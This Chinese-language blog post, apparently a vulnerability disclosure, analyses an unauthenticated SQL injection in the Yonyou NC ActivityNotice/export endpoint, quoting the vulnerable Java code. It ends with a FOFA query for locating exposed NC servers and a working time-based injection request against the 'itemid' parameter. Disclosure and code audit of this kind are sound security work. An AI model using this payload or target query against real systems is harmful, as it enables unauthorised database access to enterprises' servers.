---
title: "用友NC ActivityNotice/export SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ActivityNotice-export-sqli.html
asset_dir: assets/用友nc-activitynoticeexport-sql注入漏洞
---

# 用友NC ActivityNotice/export SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/25 08:32
- 1107浏览
- [0评论](#comment)
- 36分钟阅读

深入探索

SQL

数据库

dbms

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友) NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。⽤友NC `ActivityNotice/export` 接⼝处存在[SQL注入漏洞](https://mrxn.net/tag/SQL注入)，未授权的攻击者可以通过此漏洞获取数据库权限，进 ⼀步利⽤可导致服务器失陷。

SQL注入检测工具

# 影响版本

NC65

# fofa语法

> `icon_hash="1085941792" || app="用友-UFIDA-NC"`

# 漏洞分析

直接看 `ActivityAction` 下的 `export` 方法是如何实现的

```
@Action
    public void export() {
        try {
            LfwLogger.error("action/export打包下载was日志");
            Logger.error("action/export打包下载was日志");
            HttpServletResponse response = this.getResponse();
            response.setContentType("text/html");
            response.setCharacterEncoding("UTF-8");
            HttpServletRequest request = this.request;
            String itemid = request.getParameter("itemid");
            LfwFileVO[] vos = ActivityViewHelper.getFileIDs(itemid);
            if (vos != null && vos.length > 0) {
                OutputStream out = null;
                OutputStream var10 = response.getOutputStream();
                UFDateTime lastModify = new UFDateTime();
                response.setHeader("Last-Modified", lastModify.toString());
                response.setHeader("Content-Type", "application/zip;charset=UTF-8");
                String fileName = URLEncoder.encode(LfwResBundle.getInstance().getStrByID("signupmng", "ActivityAction-000001"), "UTF-8");
                response.setHeader("Content-Disposition", "attachment;filename=" + fileName);
                ActivityUtil.Zip(vos, var10);
                response.flushBuffer();
                IOUtils.closeQuietly(var10);
            }
        } catch (IOException e) {
            LfwLogger.error("action/export" + e.getMessage());
            Logger.error("action/export" + e.getMessage());
            Logger.error(e.getMessage(), e);
        } catch (Exception e) {
            LfwLogger.error("action/export" + e.getMessage());
            Logger.error("action/export" + e.getMessage());
            Logger.error(e.getMessage(), e);
        }

    }
```

深入探索

文本剥离工具

云安全解决方案

网络安全课程

用户可控参数 `itemid` 带入 `ActivityViewHelper.getFileIDs` 方法中，其实现如

代码安全审计

```
public static LfwFileVO[] getFileIDs(String itemID) {
        if (null == itemID) {
            return null;
        } else {
            try {
                LfwFileVO[] lfwfileVos = FileManager.getSystemFileManager("bafile").getFileByItemID(itemID);
                return lfwfileVos != null ? lfwfileVos : null;
            } catch (LfwBusinessException e) {
                throw new LfwRuntimeException(LfwResBundle.getInstance().getStrByID("signupmng", "ActivityViewHelper-000014"), e);
            }
        }
    }
```

可以看见其又被带入 `getSystemFileManager` 的 `getFileByItemID` 方法里

```
public LfwFileVO[] getFile(String billtype, String billitem) throws LfwBusinessException {
        BaseDAO dao = new BaseDAO();

        try {
            StringBuffer sb = new StringBuffer();
            new LfwFileVO();
            if (StringUtils.isNotBlank(billitem)) {
                sb.append(" pk_billitem = '").append(billitem).append("' ");
                sb.append(" order by lastmodifytime desc ");
                List<? extends SuperVO> l = (List)dao.retrieveByClause(LfwFileVO.class, sb.toString());
                return l.isEmpty() ? null : (LfwFileVO[])((LfwFileVO[])l.toArray(new LfwFileVO[0]));
```

到这里就比较明了，最终这个参数 `itemid` 是未经过任何过滤或校验就被直接拼接到sql语句中进行执行从而造成[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。

# 漏洞复现

```
POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: nc65.mrxn.net

itemid=1' AND 1=dbms_pipe.receive_message('RDS', 6)--
```

[![用友NC ActivityNotice/export SQL注入漏洞](images/img-001-5c89971ccc2f.webp)](https://image.mrxn.net/8005184003a547a89bc2c34d9d2d7d17.webp)

成功延时 6 秒

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
